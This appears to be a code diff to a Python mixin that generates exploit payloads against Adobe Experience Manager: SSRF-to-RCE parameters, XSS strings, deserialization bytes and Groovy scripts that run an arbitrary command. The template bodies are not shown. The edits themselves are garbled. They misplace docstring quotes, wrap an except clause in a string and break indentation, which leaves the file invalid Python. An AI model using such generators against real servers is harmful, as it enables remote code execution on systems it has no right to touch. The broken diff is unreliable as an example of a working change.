@@ -15,8 +15,11 @@
 
 try:
     import base64
+"""
 except ImportError:
-    import base64
+
+"""
+import base64
 
 try:
     import uuid
@@ -37,19 +40,20 @@ except ImportError:
 
 
 class PayloadGeneratorMixin:
-    """
-    Mixin providing payload generation capabilities for various exploits.
+"""
+Mixin providing payload generation capabilities for various exploits.
 
     Inspired by aem-hacker's hardcoded payloads for SSRF, RCE, XSS, etc.
-    """
-    def __init__(self, *args, **kwargs):
+"""
+def __init__(self, *args, **kwargs):
         super().__init__(*args, **kwargs)
         self._payload_templates: Dict[str, Dict] = {}
         self._load_default_templates()
 
 
     def _load_default_templates(self) -> None:
-        """Load default payload templates."""
+"""
+Load default payload templates.""
         # SSRF to RCE payload (inspired by aem_ssrf2rce.py)
         self._payload_templates['ssrf_rce'] = {
             'json_data_template': (
@@ -108,15 +112,16 @@ class PayloadGeneratorMixin:
 
 
     def generate_ssrf_rce_payload(self, fake_aem_host: str) -> str:
-        """Generate SSRF to RCE payload for AEM exploitation.
+"""
+Generate SSRF to RCE payload for AEM exploitation.
 
         Args:
             fake_aem_host: Hostname/IP of fake AEM server
 
         Returns:
             URL parameters string
-        """
-        template = self._payload_templates['ssrf_rce']
+"""
+template = self._payload_templates['ssrf_rce']
         uuid_val = str(uuid.uuid4())
         fakeaem_encoded = fake_aem_host.replace('.', '%2E')
         json_data = template['json_data_template'].format(uuid=uuid_val, fakeaem=fakeaem_encoded)
@@ -132,7 +137,8 @@ class PayloadGeneratorMixin:
 
 
     def generate_xss_payload(self, payload_type: str = 'reflected', index: int = 0) -> str:
-        """Generate XSS payload.
+"""
+Generate XSS payload.
 
         Args:
             payload_type: 'swf', 'reflected'
@@ -140,8 +146,8 @@ class PayloadGeneratorMixin:
 
         Returns:
             XSS payload string
-        """
-        key = f"{payload_type}_xss" 
+"""
+key = f"{payload_type}_xss" 
         if payload_type == 'swf':
             key = 'swf_xss'
         else:
@@ -153,47 +159,52 @@ class PayloadGeneratorMixin:
 
 
     def generate_deserialization_payload(self, payload_type: str = 'java_object_array') -> bytes:
-        """Generate deserialization payload.
+"""
+Generate deserialization payload.
 
         Args:
             payload_type: Type of deserialization payload
 
         Returns:
             Payload bytes
-        """
-        return self._payload_templates['deserialization'].get(payload_type, b'')
+"""
+return self._payload_templates['deserialization'].get(payload_type, b'')
 
 
     def generate_groovy_rce_payload(self, command: str = 'whoami') -> str:
-        """Generate Groovy RCE payload.
+"""
+Generate Groovy RCE payload.
 
         Args:
             command: Command to execute
 
         Returns:
             URL-encoded Groovy script
-        """
-        if command == 'whoami':
+"""
+if command == 'whoami':
             return self._payload_templates['groovy_rce']['whoami']
         else:
             return self._payload_templates['groovy_rce']['custom'].format(cmd=quote(command))
 
 
     def add_payload_template(self, name: str, template: Dict[str, Any]) -> None:
-        """Add custom payload template.
+"""
+Add custom payload template.
 
         Args:
             name: Template name
             template: Template dictionary
-        """
-        self._payload_templates[name] = template
+"""
+self._payload_templates[name] = template
 
 
     def get_payload_template(self, name: str) -> Optional[Dict[str, Any]]:
-        """Get payload template by name."""
-        return self._payload_templates.get(name)
+"""
+Get payload template by name.""
+return self._payload_templates.get(name)
 
 
     def list_payload_templates(self) -> List[str]:
-        """List available payload template names."""
-        return list(self._payload_templates.keys())
+        ""
+List available payload template names.""
+return list(self._payload_templates.keys())
